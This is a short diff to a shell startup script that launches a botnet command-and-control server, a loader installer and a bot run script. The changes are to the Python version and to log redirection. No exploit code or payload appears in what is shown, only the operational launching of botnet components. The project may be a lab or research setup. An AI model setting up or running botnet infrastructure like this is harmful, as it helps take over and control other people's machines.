@@ -20,7 +20,7 @@ echo ""
 
 echo "Starting the CNC server"
 echo ""
-nohup python ./botnet/server.py &
+nohup python3 ./botnet/server.py &
 echo "The CNC Server is up and running"
 echo "Find the logs in <project root>/logs/server.log"
 echo ""
@@ -29,13 +29,13 @@ lsof -i:5000
 echo ""
 
 echo "Starting the loader"
-nohup python ./loader/install/installer.py &
+python3 ./loader/install/installer.py > logs/loader.out &
 echo "Loader booted"
 echo "Find the logs in <project root>/logs/loader.log"
 
 
 echo "staring the run.sh process"
-nohup ./botnet/botrun.sh > ./logs/run.log 2>&1 &
+./botnet/botrun.sh > ./logs/run.log 2>&1 &
 echo "Find the logs in <project root>/logs/run.log"
 
 
